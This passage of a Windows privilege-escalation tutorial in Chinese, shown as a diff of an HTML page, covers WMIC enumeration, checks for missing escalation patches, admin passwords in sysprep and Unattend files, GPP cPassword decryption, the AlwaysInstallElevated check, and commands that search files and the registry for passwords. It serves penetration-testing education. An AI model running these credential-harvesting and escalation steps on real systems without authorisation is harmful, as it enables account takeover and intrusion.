+AcpiPmi      ACPI Power Meter Drive Kernel        11&#x2F;20&#x2F;2010 4:47:55 PM
+adp94xx      adp94xx                Kernel        12&#x2F;6&#x2F;2008 7:59:55 AM
+adpahci      adpahci                Kernel        5&#x2F;2&#x2F;2007 1:29:26 AM
+adpu320      adpu320                Kernel        2&#x2F;28&#x2F;2007 8:03:08 AM
+AFD          Ancillary Function Dri Kernel        11&#x2F;20&#x2F;2010 4:40:00 PM
+agp440       Intel AGP Bus Filter   Kernel        7&#x2F;14&#x2F;2009 7:25:36 AM
+aic78xx      aic78xx                Kernel        4&#x2F;12&#x2F;2006 8:20:11 AM
+aliide       aliide                 Kernel        7&#x2F;14&#x2F;2009 7:11:17 AM
+amdagp       AMD AGP Bus Filter Dri Kernel        7&#x2F;14&#x2F;2009 7:25:36 AM
+amdide       amdide                 Kernel        7&#x2F;14&#x2F;2009 7:11:19 AM
+AmdK8        AMD K8 Processor Drive Kernel        7&#x2F;14&#x2F;2009 7:11:03 AM
+AmdPPM       AMD Processor Driver   Kernel        7&#x2F;14&#x2F;2009 7:11:03 AM
+amdsata      amdsata                Kernel        3&#x2F;19&#x2F;2010 9:08:27 AM
+amdsbs       amdsbs                 Kernel        3&#x2F;21&#x2F;2009 2:35:26 AM
+amdxata      amdxata                Kernel        3&#x2F;20&#x2F;2010 12:19:01 AM
+AppID        AppID Driver           Kernel        11&#x2F;20&#x2F;2010 5:29:48 PM
+arc          arc                    Kernel        5&#x2F;25&#x2F;2007 5:31:06 AM
+[..Snip..]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="Δt-for-t4-WMIC的奥术艺术"><a href="#Δt-for-t4-WMIC的奥术艺术" class="headerlink" title="Δt for t4 - WMIC的奥术艺术"></a>Δt for t4 - WMIC的奥术艺术</h2><p>  我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。</p>
 <p>完全解释WMIC的使用将采用它自己的全部教程。更不用说由于格式化，一些输出将难以显示。</p>
-<p>我在下面列出了两个非常值得阅读的资源：<br>Command-Line Ninjitsu（SynJunkie） - <a href="http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html" target="_blank" rel="noopener">这里是</a><br>Windows WMIC命令行（ComputerHope） - <a href="http://www.computerhope.com/wmic.htm" target="_blank" rel="noopener">这里</a></p>
+<p>我在下面列出了两个非常值得阅读的资源：<br>Command-Line Ninjitsu（SynJunkie） - <a target="_blank" rel="noopener" href="http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html">这里是</a><br>Windows WMIC命令行（ComputerHope） - <a target="_blank" rel="noopener" href="http://www.computerhope.com/wmic.htm">这里</a></p>
 <p>不幸的是，除非用户在Administrators组中，否则某些Windows默认配置不允许访问WMIC（这可能是一个非常好的主意）。从我对VM的测试中我注意到，任何版本的XP都不允许从低权限帐户访问WMIC。相反，Windows 7 Professional和Windows 8 Enterprise的默认安装允许低权限用户使用WMIC并查询操作系统而无需修改任何设置。这正是我们使用WMIC收集有关目标机器的信息所需要的。</p>
 <p>为了让您了解WMIC提供的广泛选项，我已在下面列出了可用的命令行开关。  </p>
-<pre><code>C:\Windows\system32&gt; wmic /?
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; wmic &#x2F;?
 
 [global switches] 
 
 The following global switches are available:
-/NAMESPACE           Path for the namespace the alias operate against.
-/ROLE                Path for the role containing the alias definitions.
-/NODE                Servers the alias will operate against.
-/IMPLEVEL            Client impersonation level.
-/AUTHLEVEL           Client authentication level.
-/LOCALE              Language id the client should use.
-/PRIVILEGES          Enable or disable all privileges.
-/TRACE               Outputs debugging information to stderr.
-/RECORD              Logs all input commands and output.
-/INTERACTIVE         Sets or resets the interactive mode.
-/FAILFAST            Sets or resets the FailFast mode.
-/USER                User to be used during the session.
-/PASSWORD            Password to be used for session login.
-/OUTPUT              Specifies the mode for output redirection.
-/APPEND              Specifies the mode for output redirection.
-/AGGREGATE           Sets or resets aggregate mode.
-/AUTHORITY           Specifies the  for the connection.
-/?[:&lt;BRIEF|FULL&gt;]    Usage information.
+&#x2F;NAMESPACE           Path for the namespace the alias operate against.
+&#x2F;ROLE                Path for the role containing the alias definitions.
+&#x2F;NODE                Servers the alias will operate against.
+&#x2F;IMPLEVEL            Client impersonation level.
+&#x2F;AUTHLEVEL           Client authentication level.
+&#x2F;LOCALE              Language id the client should use.
+&#x2F;PRIVILEGES          Enable or disable all privileges.
+&#x2F;TRACE               Outputs debugging information to stderr.
+&#x2F;RECORD              Logs all input commands and output.
+&#x2F;INTERACTIVE         Sets or resets the interactive mode.
+&#x2F;FAILFAST            Sets or resets the FailFast mode.
+&#x2F;USER                User to be used during the session.
+&#x2F;PASSWORD            Password to be used for session login.
+&#x2F;OUTPUT              Specifies the mode for output redirection.
+&#x2F;APPEND              Specifies the mode for output redirection.
+&#x2F;AGGREGATE           Sets or resets aggregate mode.
+&#x2F;AUTHORITY           Specifies the  for the connection.
+&#x2F;?[:&lt;BRIEF|FULL&gt;]    Usage information.
 
-For more information on a specific global switch, type: switch-name /?
+For more information on a specific global switch, type: switch-name &#x2F;?
 
 
-The following alias/es are available in the current role:
+The following alias&#x2F;es are available in the current role:
 ALIAS                    - Access to the aliases available on the local system
 BASEBOARD                - Base board (also known as a motherboard or system board) management.
-BIOS                     - Basic input/output services (BIOS) management.
+BIOS                     - Basic input&#x2F;output services (BIOS) management.
 BOOTCONFIG               - Boot configuration management.
 CDROM                    - CD-ROM management.
 COMPUTERSYSTEM           - Computer system management.
@@ -594,11 +616,11 @@ NTDOMAIN                 - NT Domain management.
 NTEVENT                  - Entries in the NT Event Log.
 NTEVENTLOG               - NT eventlog file management.
 ONBOARDDEVICE            - Management of common adapter devices built into the motherboard (system board).
-OS                       - Installed Operating System/s management.
+OS                       - Installed Operating System&#x2F;s management.
 PAGEFILE                 - Virtual memory file swapping management.
 PAGEFILESET              - Page file settings management.
 PARTITION                - Management of partitioned areas of a physical disk.
-PORT                     - I/O port management.
+PORT                     - I&#x2F;O port management.
 PORTCONNECTOR            - Physical connection ports management.
 PRINTER                  - Printer device management.
 PRINTERCONFIG            - Printer device configuration management.
@@ -640,118 +662,131 @@ VOLUMEQUOTASETTING       - Associates the disk quota setting with a specific dis
 VOLUMEUSERQUOTA          - Per user storage volume quota management.
 WMISET                   - WMI service operational parameters management.
 
-For more information on a specific alias, type: alias /?
+For more information on a specific alias, type: alias &#x2F;?
 
 CLASS     - Escapes to full WMI schema.
 PATH      - Escapes to full WMI object paths.
 CONTEXT   - Displays the state of all the global switches.
-QUIT/EXIT - Exits the program.
+QUIT&#x2F;EXIT - Exits the program.
 
-For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /?
-</code></pre><p>  为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。</p>
+For more information on CLASS&#x2F;PATH&#x2F;CONTEXT, type: (CLASS | PATH | CONTEXT) &#x2F;?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>  为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。</p>
 <p>如果有人想到应该添加到列表中的内容，我已经浏览了各种标志和参数来提取有价值的信息，请在下面留言。使用内置输出功能，脚本会将所有结果写入人类可读的html文件。</p>
-<p>你可以<a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="noopener">在这里</a>下载我的脚本（wmic_info.bat）<br>Windows 7 VM上的示例输出文件（严重修补） - <a href="http://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="noopener">此处</a></p>
+<p>你可以<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar">在这里</a>下载我的脚本（wmic_info.bat）<br>Windows 7 VM上的示例输出文件（严重修补） - <a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/files/Win7.html">此处</a></p>
 <h2 id="Δt-for-t5-to-t6-快速失败"><a href="#Δt-for-t5-to-t6-快速失败" class="headerlink" title="Δt for t5 to t6 - 快速失败"></a>Δt for t5 to t6 - 快速失败</h2><p>  在继续之前，您应该花一点时间来查看您收集的信息，到目前为止应该有很多。我们的游戏计划的下一步是寻找一些快速安全性失败，可以轻松利用它来升级我们的用户权限。</p>
 <p>我们需要关注的第一个也是最明显的事情是补丁级别。如果我们发现主机被严重修补，则无需进一步担心。我的WMIC脚本已经列出了所有已安装的补丁，但您可以在下面看到示例命令行输出。  </p>
-<pre><code>C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 Caption                                     Description      HotFixID   InstalledOn
-http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013
-http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013
-http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013
-http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013
-http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013
-http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013
-http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013
-http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013
-http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013
-http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013
-http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013
-http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013
-http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013
-http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013
-http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013
-http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013
-http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013
-http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013
-http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013
-http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013
-[..Snip..]
-</code></pre><p>  与Windows一样，输出并不完全可以使用。最好的策略是查找权限提升漏洞并查找各自的KB补丁号。此类攻击包括但不限于KiTrap0D（KB979682），MS11-011（KB2393802），MS10-059（KB982799），MS10-021（KB979683），MS11-080（KB2592799）。在枚举操作系统版本和Service Pack之后，您应该找出可能存在哪些权限升级漏洞。使用KB修补程序编号，您可以grep已安装的修补程序以查看是否缺少任何修补程序。</p>
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2727528  Security Update  KB2727528  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2729462  Security Update  KB2729462  11&#x2F;26&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2736693  Security Update  KB2736693  11&#x2F;26&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2737084  Security Update  KB2737084  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2742614  Security Update  KB2742614  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2742616  Security Update  KB2742616  11&#x2F;26&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2750149  Update           KB2750149  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2756872  Update           KB2756872  11&#x2F;24&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2756923  Security Update  KB2756923  11&#x2F;26&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2757638  Security Update  KB2757638  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2758246  Update           KB2758246  11&#x2F;24&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2761094  Update           KB2761094  11&#x2F;24&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2764870  Update           KB2764870  11&#x2F;24&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2768703  Update           KB2768703  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2769034  Update           KB2769034  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2769165  Update           KB2769165  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2769166  Update           KB2769166  11&#x2F;26&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2770660  Security Update  KB2770660  11&#x2F;23&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2770917  Update           KB2770917  11&#x2F;24&#x2F;2013
+http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2771821  Update           KB2771821  11&#x2F;24&#x2F;2013
+[..Snip..]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>  与Windows一样，输出并不完全可以使用。最好的策略是查找权限提升漏洞并查找各自的KB补丁号。此类攻击包括但不限于KiTrap0D（KB979682），MS11-011（KB2393802），MS10-059（KB982799），MS10-021（KB979683），MS11-080（KB2592799）。在枚举操作系统版本和Service Pack之后，您应该找出可能存在哪些权限升级漏洞。使用KB修补程序编号，您可以grep已安装的修补程序以查看是否缺少任何修补程序。</p>
 <p>您可以在下面看到grep补丁的语法：  </p>
-<pre><code>C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;
-</code></pre><p>  接下来我们将看看大规模推出。如果存在需要安装许多机器的环境，通常，技术人员不会在机器之间四处走动。有几种解决方案可以自动安装机器。这些方法是什么以及它们如何工作对我们的目的来说不那么重要，但主要的是它们留下了用于安装过程的配置文件。这些配置文件包含许多敏感的敏感信息，例如操作系统产品密钥和管理员密码。我们最感兴趣的是管理员密码，因为我们可以使用它来提升我们的权限。</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr &#x2F;C:&quot;KB..&quot; &#x2F;C:&quot;KB..&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>  接下来我们将看看大规模推出。如果存在需要安装许多机器的环境，通常，技术人员不会在机器之间四处走动。有几种解决方案可以自动安装机器。这些方法是什么以及它们如何工作对我们的目的来说不那么重要，但主要的是它们留下了用于安装过程的配置文件。这些配置文件包含许多敏感的敏感信息，例如操作系统产品密钥和管理员密码。我们最感兴趣的是管理员密码，因为我们可以使用它来提升我们的权限。</p>
 <p>通常这些是包含配置文件的目录（但检查整个操作系统是个好主意）：</p>
-<pre><code>c:\sysprep.inf
+<pre class="line-numbers language-none"><code class="language-none">c:\sysprep.inf
 c:\sysprep\sysprep.xml 
 ％WINDIR％\Panther\Unattend\Unattended.xml 
-％WINDIR％\Panther\Unattended.xml
-</code></pre><p>这些文件包含明文密码或Base64编码格式。您可以在下面看到一些示例文件输出。  </p>
-<pre><code># This is a sample from sysprep.inf with clear-text credentials.
+％WINDIR％\Panther\Unattended.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这些文件包含明文密码或Base64编码格式。您可以在下面看到一些示例文件输出。  </p>
+<pre class="line-numbers language-none"><code class="language-none"># This is a sample from sysprep.inf with clear-text credentials.
 # This is a sample from sysprep.inf with clear-text credentials.
 
 [GuiUnattended]
-OEMSkipRegional=1
-OemSkipWelcome=1
-AdminPassword=s3cr3tp4ssw0rd
-TimeZone=20
+OEMSkipRegional&#x3D;1
+OemSkipWelcome&#x3D;1
+AdminPassword&#x3D;s3cr3tp4ssw0rd
+TimeZone&#x3D;20
 
 # This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not
 encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.
 
 &lt;LocalAccounts&gt;
-    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;
+    &lt;LocalAccount wcm:action&#x3D;&quot;add&quot;&gt;
         &lt;Password&gt;
-            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;
-            &lt;PlainText&gt;false&lt;/PlainText&gt;
-        &lt;/Password&gt;
-        &lt;Description&gt;Local Administrator&lt;/Description&gt;
-        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;
-        &lt;Group&gt;Administrators&lt;/Group&gt;
-        &lt;Name&gt;Administrator&lt;/Name&gt;
-    &lt;/LocalAccount&gt;
-&lt;/LocalAccounts&gt;
+            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA&#x3D;&#x3D;&lt;&#x2F;Value&gt;
+            &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt;
+        &lt;&#x2F;Password&gt;
+        &lt;Description&gt;Local Administrator&lt;&#x2F;Description&gt;
+        &lt;DisplayName&gt;Administrator&lt;&#x2F;DisplayName&gt;
+        &lt;Group&gt;Administrators&lt;&#x2F;Group&gt;
+        &lt;Name&gt;Administrator&lt;&#x2F;Name&gt;
+    &lt;&#x2F;LocalAccount&gt;
+&lt;&#x2F;LocalAccounts&gt;
 
 # Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.
 
 &lt;AutoLogon&gt;
     &lt;Password&gt;
-        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;
-        &lt;PlainText&gt;false&lt;/PlainText&gt;
-    &lt;/Password&gt;
-    &lt;Enabled&gt;true&lt;/Enabled&gt;
-    &lt;Username&gt;Administrator&lt;/Username&gt;
-&lt;/AutoLogon&gt;
+        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA&#x3D;&#x3D;&lt;&#x2F;Value&gt;
+        &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt;
+    &lt;&#x2F;Password&gt;
+    &lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;
+    &lt;Username&gt;Administrator&lt;&#x2F;Username&gt;
+&lt;&#x2F;AutoLogon&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><p>根据Ben Campbell（<a href="https://twitter.com/Meatballs__" target="_blank" rel="noopener">@Meatballs__</a>）的推荐，我将组策略首选项保存的密码添加到快速失败列表中。GPO首选项文件可用于在域计算机上创建本地用户。当您妥协的框连接到域时，非常值得查找存储在SYSVOL中的Groups.xml文件。任何经过身份验证的用户都具有对此文件的读取权限。xml文件中的密码通过使用AES加密来从临时用户“隐藏”，我说模糊，因为静态密钥在msdn网站上发布，允许轻松解密存储的值。</p>
-<p>除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性：<br>Services \ Services.xml：<a href="http://msdn.microsoft.com/en-us/library/cc980070.aspx" target="_blank" rel="noopener">特定于元素的属性</a><br>ScheduledTasks \ ScheduledTasks.xml：<a href="http://msdn.microsoft.com/en-us/library/cc422920.aspx" target="_blank" rel="noopener">任务内部元素</a>，<a href="http://msdn.microsoft.com/en-us/library/dd341350.aspx" target="_blank" rel="noopener">TaskV2内部元素</a>，<a href="http://msdn.microsoft.com/en-us/library/dd304114.aspx" target="_blank" rel="noopener">ImmediateTaskV2内部元素</a><br>打印机\ Printers.xml：<a href="http://msdn.microsoft.com/en-us/library/cc422918.aspx" target="_blank" rel="noopener">SharedPrinter元素</a><br>驱动器\ Drives.xml：<a href="http://msdn.microsoft.com/en-us/library/cc704598.aspx" target="_blank" rel="noopener">元素特定属性</a><br>DataSources \ DataSources.xml：<a href="http://msdn.microsoft.com/en-us/library/cc422926.aspx" target="_blank" rel="noopener">元素特定属性</a></p>
+<p>根据Ben Campbell（<a target="_blank" rel="noopener" href="https://twitter.com/Meatballs__">@Meatballs__</a>）的推荐，我将组策略首选项保存的密码添加到快速失败列表中。GPO首选项文件可用于在域计算机上创建本地用户。当您妥协的框连接到域时，非常值得查找存储在SYSVOL中的Groups.xml文件。任何经过身份验证的用户都具有对此文件的读取权限。xml文件中的密码通过使用AES加密来从临时用户“隐藏”，我说模糊，因为静态密钥在msdn网站上发布，允许轻松解密存储的值。</p>
+<p>除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性：<br>Services \ Services.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc980070.aspx">特定于元素的属性</a><br>ScheduledTasks \ ScheduledTasks.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc422920.aspx">任务内部元素</a>，<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/dd341350.aspx">TaskV2内部元素</a>，<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/dd304114.aspx">ImmediateTaskV2内部元素</a><br>打印机\ Printers.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc422918.aspx">SharedPrinter元素</a><br>驱动器\ Drives.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc704598.aspx">元素特定属性</a><br>DataSources \ DataSources.xml：<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/cc422926.aspx">元素特定属性</a></p>
 <p>可以通过手动浏览SYSVOL并抓取相关文件来利用此漏洞，如下所示。</p>
 <p><img src="http://www.fuzzysecurity.com/tutorials/images/priv06_big.png" alt="img"></p>
-<p>然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过<a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp" target="_blank" rel="noopener">此处</a>建立的会话执行<a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp" target="_blank" rel="noopener">，</a>或者（2）您可以使用Get-GPPPassword，它是<a href="https://github.com/mattifestation/PowerSploit" target="_blank" rel="noopener">PowerSploit的</a>一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。</p>
-<p>接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在<a href="http://www.greyhathacker.net/?p=185" target="_blank" rel="noopener">这里查看</a>来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。</p>
+<p>然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp">此处</a>建立的会话执行<a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp">，</a>或者（2）您可以使用Get-GPPPassword，它是<a target="_blank" rel="noopener" href="https://github.com/mattifestation/PowerSploit">PowerSploit的</a>一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。</p>
+<p>接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在<a target="_blank" rel="noopener" href="http://www.greyhathacker.net/?p=185">这里查看</a>来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。</p>
 <p>为了能够使用它，我们需要检查是否设置了两个注册表项，如果是这种情况我们可以弹出一个SYSTEM shell。您可以看到sytntax查询下面的相应注册表项。</p>
-<pre><code># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.
+<pre class="line-numbers language-none"><code class="language-none"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.
 
 C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
-C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
-</code></pre><p>为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。</p>
-<pre><code># The command below will search the file system for file names containing certain keywords. You can
+C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。</p>
+<pre class="line-numbers language-none"><code class="language-none"># The command below will search the file system for file names containing certain keywords. You can
 specify as many keywords as you wish.
 
-C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*
+C:\Windows\system32&gt; dir &#x2F;s *pass* &#x3D;&#x3D; *cred* &#x3D;&#x3D; *vnc* &#x3D;&#x3D; *.config*
 
 # Search certain file types for a keyword, this can generate a lot of output.
 
-C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt
+C:\Windows\system32&gt; findstr &#x2F;si password *.xml *.ini *.txt
 
 # Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;.
 
-C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s
-C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s
-</code></pre><h2 id="Δt-for-t7-to-t10-卷起你的袖子"><a href="#Δt-for-t7-to-t10-卷起你的袖子" class="headerlink" title="Δt for t7 to t10 - 卷起你的袖子"></a>Δt for t7 to t10 - 卷起你的袖子</h2><p>  希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。</p>
